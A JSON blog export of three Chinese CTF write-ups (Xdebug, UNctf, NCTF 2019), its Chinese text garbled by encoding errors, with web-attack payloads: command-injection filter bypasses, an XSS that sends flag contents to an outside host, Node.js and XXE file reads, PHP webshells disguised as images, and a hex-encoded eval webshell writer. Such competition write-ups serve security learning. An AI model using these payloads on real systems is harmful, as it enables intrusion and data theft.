{"name":"ctf","slug":"ctf","count":3,"postlist":[{"title":"Xdebug","slug":"Xdebug","date":"2019-08-17T15:23:45.000Z","updated":"2019-09-03T14:21:43.620Z","comments":true,"path":"api/articles/Xdebug.json","excerpt":"<p>ä½ ä»æœªè§è¿‡çš„èˆ¹æ–°çŸ¥è¯†ç‚¹</p>","keywords":null,"cover":null,"content":null,"text":"ä½ ä»æœªè§è¿‡çš„èˆ¹æ–°çŸ¥è¯†ç‚¹Xdebugå¦‚ä½•ç¡®å®šå¼€å¯åŠ¨æ€è°ƒè¯•ï¼Ÿåœ¨vpsä¸Šç›‘å¬9000ç«¯å£  nc -l -vv -p 9000å†æ‰“å¼€ä¸€ä¸ªçª—å£æ‰§è¡Œ curl &#39;http://TARGET_IP/index.php?XDEBUG_SESSION_START=phpstrom&#39","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"Xdebuf","slug":"Xdebuf","count":1,"path":"api/tags/Xdebuf.json"},{"name":"ctf","slug":"ctf","count":3,"path":"api/tags/ctf.json"}]},{"title":"UNctf èµ›åå›é¡¾","slug":"unctf","date":"2019-11-20T01:26:49.000Z","updated":"2019-12-01T12:59:49.886Z","comments":true,"path":"api/articles/unctf.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"UNctf-èµ›åå›é¡¾\"><a href=\"#UNctf-èµ›åå›é¡¾\" class=\"headerlink\" title=\"UNctf èµ›åå›é¡¾\"></a>UNctf èµ›åå›é¡¾</h1><h2 id=\"bypass\"><a href=\"#bypass\" class=\"headerlink\" title=\"bypass\"></a>bypass</h2><p>é¢˜ç›®æºç ï¼š</p>\n<pre><code>&lt;?php\n    highlight_file(__FILE__);\n    $a = $_GET[&apos;a&apos;];\n    $b = $_GET[&apos;b&apos;];\n // try bypass it\n    if (preg_match(&quot;/\\&apos;|\\&quot;|,|;|\\\\|\\`|\\*|\\n|\\t|\\xA0|\\r|\\{|\\}|\\(|\\)|&lt;|\\&amp;[^\\d]|@|\\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $a))\n        $a = &quot;&quot;;\n        $a =&apos;&quot;&apos; . $a . &apos;&quot;&apos;;\n    if (preg_match(&quot;/\\&apos;|\\&quot;|;|,|\\`|\\*|\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|&lt;|\\&amp;[^\\d]|@|\\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $b))\n        $b = &quot;&quot;;\n        $b = &apos;&quot;&apos; . $b . &apos;&quot;&apos;;\n     $cmd = &quot;file $a $b&quot;;\n      str_replace(&quot; &quot;,&quot;&quot;,&quot;$cmd&quot;); \n     system($cmd);\n?&gt;</code></pre><h3 id=\"one-way\"><a href=\"#one-way\" class=\"headerlink\" title=\"one way\"></a>one way</h3><p>æ­£åˆ™é»‘åå•åŒ¹é…ï¼Œå¯¹è¾“å…¥çš„å‚æ•°å¼ºåˆ¶åŠ ä¸ŠåŒå¼•å·ï¼Œå³ä½¿æˆ‘ä»¬ç»•è¿‡æ£€æµ‹ä¹Ÿä¼šè¢«åŠ ä¸ŠåŒå¼•å·æ— æ³•æ‰§è¡Œå‘½ä»¤ã€‚è¿™é‡Œç”¨åˆ°äº†åå¼•å· ```</p>\n<p>è§‚å¯Ÿç¬¬ä¸€ä¸ªæ­£åˆ™ `\\|`` ä¸‰ä¸ªåæ–œæ æ‰èƒ½è½¬ä¹‰åæ–œæ ï¼Œè¿™é‡Œå¯¹ | è¿›è¡Œäº†è½¬ä¹‰ä»è€Œé€ æˆåå¼•å·é€ƒé€¸ã€‚</p>\n<pre><code>&lt;?php\n$a = &quot;`dir`&quot;;\nif (preg_match(&quot;/\\&apos;|\\&quot;|,|;|\\\\|\\`/is&quot;,$a))\n    $a = &quot;&quot;;\n    $a =&apos;&quot;&apos; . $a . &apos;&quot;&apos;;\n    var_dump($a);\n\nstring(7) &quot;&quot;`dir`&quot;&quot;</code></pre><p>å¯ä»¥çœ‹åˆ°åå¼•å·æˆåŠŸé€ƒé€¸ã€‚</p>\n<p>æˆ‘ä»¬åˆ°é¢˜ç›®ä¸­å°è¯•åˆ—ç›®å½•ï¼Œæ²¡æœ‰ <code>ls</code> å¯ä»¥ç”¨ <code>dir</code></p>\n<pre><code>?a=`dir%20/`\n\nå“åº”ï¼š\n\nbin dev home lib64 mnt proc run srv sys usr boot etc lib media opt root sbin start.sh tmp var: cannot open `bin dev home lib64\\011mnt proc run\\011 srv\\011 sys\\011usr\\012boot etc lib\\011 media\\011opt root sbin start.sh tmp\\011var&apos; (No such file or directory) : cannot open `&apos; (No such file or directory) </code></pre><p>æŸ¥æ‰¾flag </p>\n<pre><code>?a=`/b??/gr??%20-R%20unctf`\n\nå“åº”ï¼š\n.F1jh_/h3R3_1S_your_F1A9.txt:unctf{86dfe85d7c5842c5c04adae104193ee1}: cannot open `.F1jh_/h3R3_1S_your_F1A9.txt:unctf{86dfe85d7c5842c5c04adae104193ee1}&apos; (No such file or directory) : cannot open `&apos; (No such file or directory) </code></pre><h2 id=\"another-way\"><a href=\"#another-way\" class=\"headerlink\" title=\"another way\"></a>another way</h2><p>ç¬¬äºŒä¸ªæ­£åˆ™ <code>\\\\|\\n</code> ä¼šè§£é‡Šä¸ºç«–çº¿å’Œæ¢è¡Œï¼Œæ‰€ä»¥åˆ©ç”¨ <code>%0a</code> è¿›è¡Œæ¢è¡Œç»•è¿‡ï¼ŒåŒæ—¶æœ«å°¾ä½¿ç”¨ <code>%20#</code> æ¥ç»ˆæ­¢å‘½ä»¤å¤„ç†åŒå¼•å·</p>\n<pre><code>?a=\\&amp;b=%0a/???/gr?p%20-R%20ctf%20%23\næ•ˆæœæ˜¯\nfile&quot;\\&quot;&quot;\n/???/gr?p -R ctf #&quot;</code></pre><h2 id=\"easy-xss\"><a href=\"#easy-xss\" class=\"headerlink\" title=\"easy xss\"></a>easy xss</h2><p>åœ¨ç•™è¨€æ¿å¤„æäº¤ xss å‘ç°èƒ½å¤Ÿè§¦å‘ï¼Œè®¿é—®å‚¨å­˜çš„è·¯å¾„å‘ç°ä¸€ä¸ªæ¥å£</p>\n<pre><code>http://112.74.37.15:8010/index.php/treehole/view?id=5dcd1d7bd11a4</code></pre><p>æ­¤æ—¶çš„è¯·æ±‚å¤´é‡Œå¸¦ä¸Šäº† <code>XMLHttpRequest</code> ï¼ŒåŒæ—¶ä¸å¸¦å‚æ•°è®¿é—®æ—¶å¾—åˆ° debug é¡µé¢ï¼Œå¯ä»¥çœ‹åˆ° XHRè¯·æ±‚å¸¦ä¸Šäº† cookie ï¼Œäºæ˜¯æˆ‘ä»¬æ„é€  XHR è¯·æ±‚</p>\n<pre><code>&lt;img src=&apos;/efefefe&apos; onerror=&quot;xmlhttp=new\nXMLHttpRequest();xmlhttp.withCredentials=true;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){location.href=&apos;http://xssye.com/kOaI/?flag=&apos;\nxmlhttp.responseText.match(&apos;flag\\\\{(.\\*?)\\\\}&apos;)[1]}};xmlhttp.open(&apos;GET&apos;,&apos;/index.php/treehole/view?id=&apos;,true);xmlhttp.send(&apos;&apos;);&quot;/\\&gt;</code></pre><h2 id=\"checkin\"><a href=\"#checkin\" class=\"headerlink\" title=\"checkin\"></a>checkin</h2><p>æŸ¥çœ‹æºç å‘ç°å„ä¸ªæ¥å£</p>\n<pre><code>      switch (e.cmd) {\n        case &apos;name&apos;:\n          this.nickname = e.msg,\n          this.kesshoubanMsg(`Change nickname ${this.nickname\n        }\n         success!`);\n        break;\n      case &apos;error&apos;:\n        this.kesshoubanMsg(`ğŸ™${e.msg\n    }\n    `);\n    break;\n  case &apos;calc&apos;:\n    this.kesshoubanMsg(`${e.msg\n  }\n  `);\n  break;\ncase &apos;flag&apos;:\n  this.kesshoubanMsg(`${e.msg\n}\n`);</code></pre><p>ä¿®æ”¹å®Œåå­—åæµ‹è¯• <code>/calc 1+1</code> å‘ç°æˆåŠŸæ‰§è¡Œï¼Œå­˜åœ¨ä»£ç æ³¨å…¥å‚è€ƒ<a href=\"http://qnkcdz0.xyz/2019/06/24/Node-js%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Beval%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/\" target=\"_blank\" rel=\"noopener\">http://qnkcdz0.xyz/2019/06/24/Node-js%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Beval%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</a></p>\n<p>å°è¯• <code>/calc require(&#39;child_process&#39;).execSync(&#39;cat$IFS/flag&#39;).toString();</code> å…¶ä¸­ç©ºæ ¼è¿‡æ»¤ç»•è¿‡ $IFS ï¼ŒåŒæ—¶Syncé‡‡ç”¨éé˜»å¡è¿”å›ã€‚</p>\n","text":"UNctf èµ›åå›é¡¾bypassé¢˜ç›®æºç ï¼š&lt;?php    highlight_file(__FILE__);    $a = $_GET[&apos;a&apos;];    $b = $_GET[&apos;b&apos;]; // try bypass it    i","link":"","raw":null,"photos":[],"categories":[{"name":"wp","slug":"wp","count":2,"path":"api/categories/wp.json"}],"tags":[{"name":"ctf","slug":"ctf","count":3,"path":"api/tags/ctf.json"},{"name":"wp","slug":"wp","count":3,"path":"api/tags/wp.json"}]},{"title":"NCTF","slug":"NCTF","date":"2019-11-26T12:45:31.000Z","updated":"2020-04-29T05:45:19.118Z","comments":true,"path":"api/articles/NCTF.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"NCTF\"><a href=\"#NCTF\" class=\"headerlink\" title=\"NCTF\"></a>NCTF</h1><p>11/26/2019 8:45:31 PM </p>\n<h2 id=\"WEB\"><a href=\"#WEB\" class=\"headerlink\" title=\"WEB\"></a>WEB</h2><h3 id=\"Fake-XML-cookbook\"><a href=\"#Fake-XML-cookbook\" class=\"headerlink\" title=\"Fake XML cookbook\"></a>Fake XML cookbook</h3><p>ç®€å•çš„xxe</p>\n<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; \n&lt;!DOCTYPE creds [  \n&lt;!ENTITY goodies SYSTEM &quot;file:///flag&quot;&gt; ]&gt; \n\n&lt;user&gt;&lt;username&gt;&amp;goodies;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;</code></pre><h3 id=\"ture-XML-cookbook\"><a href=\"#ture-XML-cookbook\" class=\"headerlink\" title=\"ture XML cookbook\"></a>ture XML cookbook</h3><p>å¸¸ç”¨çš„å†…ç½‘IPæ–‡ä»¶<code>/etc/hosts</code> ã€ <code>/proc/net/arp</code> ã€ <code>/proc/net/fib_trie</code></p>\n<p><strong>requests</strong></p>\n<pre><code>&lt;!DOCTYPE ANY [\n\n&lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/proc/net/fib_trie&quot;&gt;\n\n]&gt;\n\n\n&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;adssa&lt;/password&gt;&lt;/user&gt;</code></pre><p><strong>response</strong></p>\n<pre><code>X-Powered-By: PHP/7.4.0RC6\n\n\n&lt;result&gt;&lt;code&gt;0&lt;/code&gt;&lt;msg&gt;TWFpbjoKICArLS0gMC4wLjAuMC8wIDIgMCAyCiAgICAgKy0tIDEyNy4wLjAuMC84IDIgMCAyCiAgICAgICAgKy0tIDEyNy4wLjAuMC8zMSAxIDAgMAogICAgICAgICAgIHwtLSAxMjcuMC4wLjAKICAgICAgICAgICAgICAvMzIgbGluayBCUk9BRENBU1QKICAgICAgICAgICAgICAvOCBob3N0IExPQ0FMCiAgICAgICAgICAgfC0tIDEyNy4wLjAuMQogICAgICAgICAgICAgIC8zMiBob3N0IExPQ0FMCiAgICAgICAgfC0tIDEyNy4yNTUuMjU1LjI1NQogICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVAogICAgICstLSAxNzMuMjI1LjE1MC4wLzI0IDIgMCAyCiAgICAgICAgKy0tIDE3My4yMjUuMTUwLjAvMjggMiAwIDIKICAgICAgICAgICB8LS0gMTczLjIyNS4xNTAuMAogICAgICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVAogICAgICAgICAgICAgIC8yNCBsaW5rIFVOSUNBU1QKICAgICAgICAgICB8LS0gMTczLjIyNS4xNTAuOQogICAgICAgICAgICAgIC8zMiBob3N0IExPQ0FMCiAgICAgICAgfC0tIDE3My4yMjUuMTUwLjI1NQogICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVApMb2NhbDoKICArLS0gMC4wLjAuMC8wIDIgMCAyCiAgICAgKy0tIDEyNy4wLjAuMC84IDIgMCAyCiAgICAgICAgKy0tIDEyNy4wLjAuMC8zMSAxIDAgMAogICAgICAgICAgIHwtLSAxMjcuMC4wLjAKICAgICAgICAgICAgICAvMzIgbGluayBCUk9BRENBU1QKICAgICAgICAgICAgICAvOCBob3N0IExPQ0FMCiAgICAgICAgICAgfC0tIDEyNy4wLjAuMQogICAgICAgICAgICAgIC8zMiBob3N0IExPQ0FMCiAgICAgICAgfC0tIDEyNy4yNTUuMjU1LjI1NQogICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVAogICAgICstLSAxNzMuMjI1LjE1MC4wLzI0IDIgMCAyCiAgICAgICAgKy0tIDE3My4yMjUuMTUwLjAvMjggMiAwIDIKICAgICAgICAgICB8LS0gMTczLjIyNS4xNTAuMAogICAgICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVAogICAgICAgICAgICAgIC8yNCBsaW5rIFVOSUNBU1QKICAgICAgICAgICB8LS0gMTczLjIyNS4xNTAuOQogICAgICAgICAgICAgIC8zMiBob3N0IExPQ0FMCiAgICAgICAgfC0tIDE3My4yMjUuMTUwLjI1NQogICAgICAgICAgIC8zMiBsaW5rIEJST0FEQ0FTVAo=&lt;/msg&gt;&lt;/result&gt;</code></pre><p>è§£å¯†ï¼š</p>\n<pre><code>Main:\n  +-- 0.0.0.0/0 2 0 2\n +-- 127.0.0.0/8 2 0 2\n+-- 127.0.0.0/31 1 0 0\n   |-- 127.0.0.0\n  /32 link BROADCAST\n  /8 host LOCAL\n   |-- 127.0.0.1\n  /32 host LOCAL\n|-- 127.255.255.255\n   /32 link BROADCAST\n +-- 173.225.150.0/24 2 0 2\n+-- 173.225.150.0/28 2 0 2\n   |-- 173.225.150.0\n  /32 link BROADCAST\n  /24 link UNICAST\n   |-- 173.225.150.9\n  /32 host LOCAL\n|-- 173.225.150.255\n   /32 link BROADCAST\nLocal:\n  +-- 0.0.0.0/0 2 0 2\n +-- 127.0.0.0/8 2 0 2\n+-- 127.0.0.0/31 1 0 0\n   |-- 127.0.0.0\n  /32 link BROADCAST\n  /8 host LOCAL\n   |-- 127.0.0.1\n  /32 host LOCAL\n|-- 127.255.255.255\n   /32 link BROADCAST\n +-- 173.225.150.0/24 2 0 2\n+-- 173.225.150.0/28 2 0 2\n   |-- 173.225.150.0\n  /32 link BROADCAST\n  /24 link UNICAST\n   |-- 173.225.150.9\n  /32 host LOCAL\n|-- 173.225.150.255\n   /32 link BROADCAST</code></pre><p>ç…§ç€Ipè®¿é—®ï¼Œåæ§½æˆ‘çš„windowsä¸‹burpå“åº”å…¨æ˜¯ä¹±ç ï¼Œæäº†åŠå¤©å»kaliå°±æ²¡äº‹äº†ã€‚</p>\n<h3 id=\"ezphp\"><a href=\"#ezphp\" class=\"headerlink\" title=\"ezphp\"></a>ezphp</h3><pre><code>&lt;?php\nerror_reporting(0);\nhighlight_file(__file__);\n$string_1 = $_GET[&apos;str1&apos;];\n$string_2 = $_GET[&apos;str2&apos;];\n$cmd = $_GET[&apos;q_w_q&apos;];\n\n\n//1st\nif($_GET[&apos;num&apos;] !== &apos;23333&apos; &amp;&amp; preg_match(&apos;/^23333$/&apos;, $_GET[&apos;num&apos;])){\n    echo &apos;1st ok&apos;.&quot;&lt;br&gt;&quot;;\n}\nelse{\n    die(&apos;23333333&apos;);\n}\n\n\n//2nd\nif(is_numeric($string_1)){\n    $md5_1 = md5($string_1);\n    $md5_2 = md5($string_2);\n    if($md5_1 != $md5_2){\n        $a = strtr($md5_1, &apos;cxhp&apos;, &apos;0123&apos;);    //strstr â€” æŸ¥æ‰¾å­—ç¬¦ä¸²çš„é¦–æ¬¡å‡ºç°ï¼Œ\n        $b = strtr($md5_2, &apos;cxhp&apos;, &apos;0123&apos;);\n        if($a == $b){\n            echo &apos;2nd ok&apos;.&quot;&lt;br&gt;&quot;;\n        }\n        else{\n            die(&quot;can u give me the right str???&quot;);\n        }\n    } \n    else{\n        die(&quot;no!!!!!!!!&quot;);\n    }\n}\nelse{\n    die(&apos;is str1 numeric??????&apos;);\n}\n\n\n//3rd\n$query = $_SERVER[&apos;QUERY_STRING&apos;];\nif (strlen($cmd) &gt; 8){\n    die(&quot;too long :(&quot;);\n}\n\nif( substr_count($query, &apos;_&apos;) === 0 &amp;&amp; substr_count($query, &apos;%5f&apos;) === 0 ){\n    $arr = explode(&apos; &apos;, $cmd);          //explode â€” ä½¿ç”¨ä¸€ä¸ªå­—ç¬¦ä¸²åˆ†å‰²å¦ä¸€ä¸ªå­—ç¬¦ä¸²\n    if($arr[0] !== &apos;ls&apos; || $arr[0] !== &apos;pwd&apos;){\n        if(substr_count($cmd, &apos;cat&apos;) === 0){\n            system($cmd);\n        }\n        else{\n            die(&apos;ban cat :) &apos;);\n        }\n    }\n    else{\n        die(&apos;bad guy!&apos;);\n    }\n}\nelse{\n    die(&apos;nonono _ is bad&apos;);\n}\n?&gt; </code></pre><p>ç¬¬ä¸€å±‚ä½¿ç”¨ %0a æˆªæ–­ç»•è¿‡ï¼Œç¬¬äºŒå±‚md5ç»•è¿‡<a href=\"https://brainlyh.github.io/2019/08/19/Black-magic/#md5%E6%AF%94%E8%BE%83\" target=\"_blank\" rel=\"noopener\">https://brainlyh.github.io/2019/08/19/Black-magic/#md5%E6%AF%94%E8%BE%83</a> å‰é¢å‡ æ¡0eå¼€å¤´çš„å­—ç¬¦ä¸²å»è§£å¯†å‘ç°éƒ½æ”¶è´¹ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨ <code>s878926199a</code> ,åŠ å¯†å®Œè§£å¯†å¾— <code>2120624</code> ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨æ•°å­—ç»•è¿‡ç¬¬ä¸€ä¸ªåˆ¤æ–­ï¼Œç¬¬ä¸‰å±‚ ä½¿ç”¨ <code>.</code> ç»•è¿‡ <code>_</code> ï¼Œ<code>%20</code> æ›¿ä»£ç©ºæ ¼ï¼Œä½¿ç”¨<code>l${x}s</code> åˆ—ç›®å½•ï¼Œ<code>tac%20f*</code> è¯» <code>flag</code> .</p>\n<p>çœ‹ä¸€ä¸ª <code>strstr()</code> çš„ä¾‹å­</p>\n<pre><code>$email  = &apos;name@example.com&apos;;\n$domain = strstr($email, &apos;@&apos;);\necho $domain.&quot;\\r\\n&quot;; // æ‰“å° @example.com\n\n$user = strstr($email, &apos;@&apos;, true); // ä» PHP 5.3.0 èµ·\necho $user.&quot;\\r\\n&quot;; // æ‰“å° name\nvar_dump(&quot;01&quot;==true);\n\nè¾“å‡ºï¼š\n@example.com\nname\nbool(true)</code></pre><p>payload:</p>\n<pre><code>?num=23333%0a\n&amp;str1=2120624\n&amp;str2=s214587387a\n&amp;q.w.q=tac%20f*</code></pre><h3 id=\"hacker-backdoor\"><a href=\"#hacker-backdoor\" class=\"headerlink\" title=\"hacker backdoor\"></a>hacker backdoor</h3><pre><code> &lt;?php\nerror_reporting(0);\nif(!isset($_GET[&apos;code&apos;]) || !isset($_GET[&apos;useful&apos;])){\n    highlight_file(__file__);\n}\n$code = $_GET[&apos;code&apos;];\n$usrful = $_GET[&apos;useful&apos;];\n\nfunction waf($a){\n    $dangerous = get_defined_functions();    //get_defined_functions â€” è¿”å›æ‰€æœ‰å·²å®šä¹‰å‡½æ•°çš„æ•°ç»„\n    array_push($dangerous[&quot;internal&quot;], &apos;eval&apos;, &apos;assert&apos;);  //å‹å…¥æ ˆåº•\n    foreach ($dangerous[&quot;internal&quot;] as $bad) {\n        if(strpos($a,$bad) !== FALSE){\n        return False;\n        break;\n        }\n    }\n    return True;\n}\n\nif(file_exists($usrful)){\n    if(waf($code)){\n        eval($code);\n    }\n    else{\n        die(&quot;oh,ä¸èƒ½è¾“å…¥è¿™äº›å‡½æ•°å“¦ :) &quot;);\n    }\n}</code></pre><p>æµ‹è¯•ä¸€ä¸‹$dangerous</p>\n<pre><code>&lt;?php  \n$dangerous = get_defined_functions();\narray_push($dangerous[&quot;internal&quot;], &apos;eval&apos;, &apos;assert&apos;);\nforeach ($dangerous[&quot;internal&quot;] as $bad) { \n    if(strpos(&quot;phpinfo&quot;,$bad)!== FALSE){\n        echo &quot;badbad&quot;.&quot;\\r\\n&quot;;\n    }\n}\n?&gt;</code></pre><p>ä½¿ç”¨å‘½ä»¤æ‹¼æ¥ç»•è¿‡ waf()</p>\n<pre><code>?code=?&gt;&lt;?php $a=&apos;php&apos;.&apos;info&apos;;$a();?&gt;\n&amp;useful=index.php</code></pre><p>disable_functiongs:</p>\n<pre><code>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,system,shell_exec,popen,passthru,link,symlink,syslog,imap_open,ld,error_log,mail,assert,file_put_contents,scandir,file_get_contents,readfile,fread,fopen,chdir,unlink,delete</code></pre><p>ä»¤æ‰§è¡Œåˆ©ç”¨åŠç»•è¿‡å§¿åŠ¿ã€€ã€€</p>\n<p>å†™å…¥webshell:</p>\n<p>åˆ©ç”¨å‘½ä»¤æ³¨å…¥å†™ä¸€å¥è¯php webshellåˆ°webç›®å½•æ¶‰åŠåˆ°ä¸€äº›ç‰¹æ®Šå­—ç¬¦çš„è½¬ä¹‰ï¼Œå‡è®¾éœ€è¦å†™å…¥<?php eval($_POST[kang]); ?>ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š<br>WINDOWSï¼šç”¨^è½¬ä¹‰&lt;ï¼Œå³æ‰§è¡Œecho ^&lt;?php eval($_POST[kang]); ?^&gt; &gt; webå¯å†™ç›®å½•åŠ æ–‡ä»¶å®Œæ•´åå­—</p>\n<p>linuxä¸‹éœ€è¦ç”¨\\æ¥è½¬ä¹‰&lt;ï¼Œä¸è¿‡å¾ˆå¤šphpéƒ½é»˜è®¤å¼€å¯gpcï¼ˆé­”æœ¯å¼•å·magic_quotes_gpc()ï¼‰ã€‚å¯ä»¥å…ˆç”¨16è¿›åˆ¶è½¬æ¢ä¸€å¥è¯å†ç”¨xxdå‘½ä»¤æŠŠ16è¿›åˆ¶è¿˜åŸï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š<br>echo 3c3f706870206576616c28245f504f53545b6b616e675d293b203f3e|xxd -r -ps &gt; webå¯å†™ç›®å½•åŠ æ–‡ä»¶å®Œæ•´åå­—</p>\n<p>| å‘½ä»¤ç®¡é“ç¬¦</p>\n<p>&lt;&gt;&gt;&gt; æ–‡ä»¶é‡å®šå‘ç¬¦</p>\n<p>æµ‹è¯•ï¼š 0 | dir c:</p>\n<p>ã€€ã€€ä»£ç åªè¿‡æ»¤äº†éƒ¨åˆ†ç‰¹æ®Šå­—ç¬¦ï¼Œå¯ä»¥è€ƒè™‘ç”¨å…¶ä»–å­—ç¬¦è¿›è¡Œæµ‹è¯•ï¼Œè¿™è¾¹åˆ—ä¸¾ä¸€ä¸‹Window/Linuxå¯åˆ©ç”¨çš„ç‰¹æ®Šå­—ç¬¦ï¼š</p>\n<p>windowsæ”¯æŒï¼š</p>\n<p>|     ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥      ping 127.0.0.1|whoami          </p>\n<p>||    å‰é¢å‡ºé”™æ‰§è¡Œåé¢çš„ ï¼Œå‰é¢ä¸ºå‡       ping  2 || whoami </p>\n<p>&amp;   å‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥æ‰§è¡Œåé¢çš„,å‰é¢å¯çœŸå¯å‡                       ping 127.0.0.1&amp;whoami</p>\n<p>&amp;&amp;å‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥å‡ºé”™ï¼Œåé¢çš„ä¹Ÿä¸æ‰§è¡Œï¼Œå‰é¢åªèƒ½ä¸ºçœŸ    ping 127.0.0.1&amp;&amp;whoami</p>\n<p>Linuxæ”¯æŒ(æ¯”ä¸Šé¢å¤šä¸€ä¸ª):</p>\n<p>;     å‰é¢çš„æ‰§è¡Œå®Œæ‰§è¡Œåé¢çš„      ping 127.0.0.1;whoami  </p>\n<h3 id=\"upload-your-shell\"><a href=\"#upload-your-shell\" class=\"headerlink\" title=\"upload your shell\"></a>upload your shell</h3><p>æ‰“å¼€é¢˜ç›®åœ¨å¤´åƒé‚£é‡Œå¾— image æ‰¾åˆ°ä¸Šä¼ ç‚¹ï¼Œå…ˆä¸Šä¼ </p>\n<pre><code>&lt;?php \n    @eval($_POST[shell]);\n     ?&gt;</code></pre><p>æç¤º <code>&lt;?</code> ï¼Œç„¶åç›´æ¥æ‹¿ä¸Šæ¬¡ SUCTF ç”¨å‰©ä¸‹å¾—é©¬</p>\n<pre><code>GIF89a\n&lt;script language=&apos;php&apos;&gt;\n    #system(&apos;cat /flag&apos;);\n    @eval($_POST[shell]);\n&lt;/script&gt;</code></pre><p>ç„¶åå†ä¿®æ”¹ content-type ï¼Œä¼ å®Œå¾—åˆ°å›¾ç‰‡è·¯å¾„ï¼Œä½†æ˜¯ä¸èƒ½ç›´æ¥è®¿é—®ï¼Œè§‚å¯Ÿåˆ°é“¾æ¥ä¸º </p>\n<pre><code>http://nctf2019.x1ct34m.com:60002/index.php?action=menu.html </code></pre><p>äºæ˜¯è®¿é—®</p>\n<pre><code>?action=upload-imgs/33498eb8814e110403efa2aebdff72d8/Th1s_is_a_fl4g.jpg</code></pre><p>å³å¯</p>\n<h3 id=\"replace\"><a href=\"#replace\" class=\"headerlink\" title=\"replace\"></a>replace</h3><p>æ–‡å­—æ›¿æ¢å·¥å…·ï¼Œhintï¼š<code>ä½¿ç”¨php5.6+bootstrapè¿›è¡Œå¼€å‘</code> ï¼ŒçŒœæµ‹ <code>preg_replace</code> çš„ <code>/e</code> ä»£ç æ‰§è¡Œã€‚</p>\n<p>ç¬¬ä¸‰ä¸ªæ¡†å†…çš„å†…å®¹åº”è¯¥å°±æ˜¯ /eçš„éƒ¨åˆ†ï¼Œæˆ‘ä»¬è¾“å…¥ <code>var_dump(111)</code> ï¼ŒæˆåŠŸæ‰“å° <code>int(111)</code> ï¼Œè¾“å…¥å•å¼•å·åŒå¼•å·éƒ½ä¼šè¢«è¿‡æ»¤ï¼Œå¯ä»¥åˆ©ç”¨ chr() æ¥ç»•è¿‡ã€‚</p>\n<p>æˆ‘ä»¬è¾“å…¥scandir(chr(47)) å‘ç°åˆ—ä¸äº†ç›®å½•ã€‚ç›´æ¥è¯»æ–‡ä»¶ </p>\n<pre><code>file_get_contents(chr(47).chr(102).chr(108).chr(97).chr(103))//file_get_contents(&quot;/flag&quot;)</code></pre>","text":"NCTF11/26/2019 8:45:31 PM WEBFake XML cookbookç®€å•çš„xxe&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE creds [  &","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"ctf","slug":"ctf","count":3,"path":"api/tags/ctf.json"}]}]}